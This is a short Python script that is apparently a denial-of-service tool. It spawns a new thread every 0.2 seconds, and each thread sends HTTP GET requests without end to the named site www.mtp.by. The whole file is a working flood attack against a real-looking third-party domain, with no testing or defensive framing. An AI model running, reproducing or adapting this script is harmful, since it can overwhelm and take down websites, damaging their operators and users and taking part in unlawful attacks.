# coding: utf8
import threading
import requests
import time


def dos():
    while True:
        requests.get("http://www.mtp.by")


while True:
    threading.Thread(target=dos).start()
    time.sleep(0.2)